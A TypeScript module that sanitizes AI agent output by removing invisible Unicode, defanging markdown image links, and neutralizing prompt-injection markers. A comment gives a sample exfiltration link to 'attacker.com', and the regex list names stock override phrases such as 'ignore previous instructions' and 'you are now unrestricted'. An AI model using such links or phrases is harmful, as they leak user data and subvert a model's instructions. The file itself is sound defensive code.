// Regex matching invisible unicode, zero-width characters, and BiDi override exploits
const INVISIBLE_UNICODE_REGEX =
  /[\u200B\u200C\u200D\uFEFF\u00AD\u2060\u2061\u2062\u2063\u2064\u202A\u202B\u202C\u202D\u202E]/g;

// Markdown image exfiltration pattern: ![alt text](https://attacker.com/leak?data=...)
const MARKDOWN_IMAGE_EXFIL_REGEX = /!\[([^\]]*)\]\((https?:\/\/[^\s)]+)\)/gi;

// Known Indirect Prompt Injection hijack signatures
const INJECTION_TAG_PATTERNS = [
  { pattern: /\[\s*SYSTEM\s*\]/gi, replacement: '[quoted_system_tag]' },
  { pattern: /\[\s*INSTRUCTION\s*\]/gi, replacement: '[quoted_instruction_tag]' },
  { pattern: /<\|\s*im_start\s*\|>/gi, replacement: '&lt;|im_start|&gt;' },
  { pattern: /<\|\s*im_end\s*\|>/gi, replacement: '&lt;|im_end|&gt;' },
  { pattern: /<\|\s*system\s*\|>/gi, replacement: '&lt;|system|&gt;' },
  { pattern: /<script[\s\S]*?>[\s\S]*?<\/script>/gi, replacement: '[script_block_removed]' },
  {
    pattern: /\b(?:ignore|disregard|forget)\s+(?:all\s+)?(?:previous|earlier|prior)\s+(?:instructions|prompts|rules)\b/gi,
    replacement: '[neutralized_prompt_override_attempt]',
  },
  {
    pattern: /\b(?:you\s+are\s+now|act\s+as)\s+(?:an?\s+)?unrestricted\b/gi,
    replacement: '[neutralized_roleplay_override_attempt]',
  },
];

export function stripZeroWidthAndInvisibleChars(text: string): string {
  if (!text) return '';
  return text.replace(INVISIBLE_UNICODE_REGEX, '');
}

export function stripMarkdownImageExfiltration(text: string): string {
  if (!text) return '';
  return text.replace(MARKDOWN_IMAGE_EXFIL_REGEX, '`[image: $1 - link neutralized]`');
}

export function neutralizePromptInjectionTags(text: string): string {
  if (!text) return '';
  let result = text;
  for (const { pattern, replacement } of INJECTION_TAG_PATTERNS) {
    result = result.replace(pattern, replacement);
  }
  return result;
}

export function sanitizeAgentOutput(content: string): string {
  if (!content) return '';
  // 1. Strip invisible zero-width unicode
  let clean = stripZeroWidthAndInvisibleChars(content);
  // 2. Defang markdown image exfiltration
  clean = stripMarkdownImageExfiltration(clean);
  // 3. Neutralize indirect prompt injection tags
  clean = neutralizePromptInjectionTags(clean);
  return clean;
}
